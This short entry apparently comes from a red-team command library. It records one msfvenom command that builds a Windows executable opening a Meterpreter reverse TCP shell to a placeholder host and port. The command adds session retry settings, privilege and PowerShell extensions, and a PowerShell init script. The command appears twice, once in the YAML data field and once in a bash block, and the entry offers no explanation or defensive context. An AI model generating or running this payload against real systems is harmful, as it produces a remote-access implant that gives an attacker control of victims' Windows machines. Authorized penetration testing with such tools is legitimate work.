---
id: 9e9c57f5-3ed3-469f-96b1-79258d30abe5
name: Create Windows Meterpreter Reverse TCP Payload
type: command
executor: bash
data: msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30
  sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1
  -f exe
output: null
created_at: '2023-04-06T03:56:21.692310+00:00'
updated_at: '2023-04-10T20:24:56.696544+00:00'
---

# Create Windows Meterpreter Reverse TCP Payload

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```


